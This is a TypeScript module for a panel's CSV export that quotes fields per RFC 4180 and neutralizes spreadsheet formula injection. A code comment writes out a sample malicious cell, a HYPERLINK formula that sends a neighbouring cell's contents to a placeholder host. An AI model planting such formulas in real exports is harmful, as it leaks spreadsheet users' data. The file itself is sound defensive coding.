// F8 (CSV export): the one RFC 4180 encoder every CSV export in this panel
// builds on (usage-csv.ts's usageCsv/modelDetailCsv, the Models tab's
// export) — one implementation, not a copy per export (vue.md: "if you've
// written it twice, you owe an abstraction").

/** CSV_LINE_ENDING is RFC 4180's own line terminator (CRLF), not the bare "\n" a JS template literal defaults to — Excel and most spreadsheet importers expect it, and RFC 4180 section 2.1 requires it. */
const CSV_LINE_ENDING = '\r\n'

/** CSV_SPECIAL_CHARS matches any character that forces a field into a quoted form: comma (the delimiter itself), a double quote, or either newline character a multi-line field could carry. */
const CSV_SPECIAL_CHARS = /[",\r\n]/

/**
 * CSV_FORMULA_LEAD_CHARS matches a cell whose text BEGINS with a character
 * a spreadsheet importer (Excel, Google Sheets, LibreOffice) treats as the
 * start of a formula: `=` `+` `-` `@`, or a leading tab/carriage return
 * (both used historically to smuggle a formula past a leading-character
 * check alone — OWASP's CSV Injection guidance lists all six). P4
 * (security): model ids and user/group ids exported by this panel are
 * partly UPSTREAM-controlled (a discovered model id, admin.go) or
 * operator-configured — a malicious id like
 * `=HYPERLINK("http://x/?"&A1,"x")` executes the moment the export is
 * opened in a spreadsheet, not just displayed as text.
 */
const CSV_FORMULA_LEAD_CHARS = /^[=+\-@\t\r]/

/**
 * csvField renders one cell as an RFC 4180 field: `String(value)` first (so
 * callers can pass numbers/booleans/undefined without converting them
 * first — `undefined`/`null` become the empty string, not the literal text
 * "undefined"/"null"). A value starting with a formula-trigger character
 * (CSV_FORMULA_LEAD_CHARS above) is prefixed with a single quote FIRST
 * (OWASP CSV Injection guidance: a leading `'` makes every major
 * spreadsheet importer treat the whole cell as literal text, never a
 * formula) — quoting/escaping below then applies to that neutralized text,
 * exactly as it would to any other value, so a formula-triggering id that
 * also contains a comma or quote still gets both defenses. A field with
 * neither a formula-trigger character nor an RFC 4180 special character is
 * left bare — matches every real-world CSV consumer's expectation and
 * keeps the common case (plain numbers, short ids) readable in a text
 * diff.
 */
function csvField(value: unknown): string {
  let s = value === null || value === undefined ? '' : String(value)
  if (CSV_FORMULA_LEAD_CHARS.test(s)) s = `'${s}`
  if (!CSV_SPECIAL_CHARS.test(s)) return s
  return `"${s.replace(/"/g, '""')}"`
}

/**
 * toCsv renders a header row plus data rows as one RFC 4180 CSV string:
 * CRLF between every row (including after the final one, matching most
 * spreadsheet tools' own export convention), each field quoted only when
 * it needs to be (csvField above). Every export in this panel
 * (usage-csv.ts, and WP-B2's model-ranking export) funnels through this
 * one function so quoting/line-ending behavior is defined and tested in
 * exactly one place.
 */
export function toCsv(headers: string[], rows: unknown[][]): string {
  const lines = [headers, ...rows].map((row) => row.map(csvField).join(','))
  return lines.join(CSV_LINE_ENDING) + CSV_LINE_ENDING
}
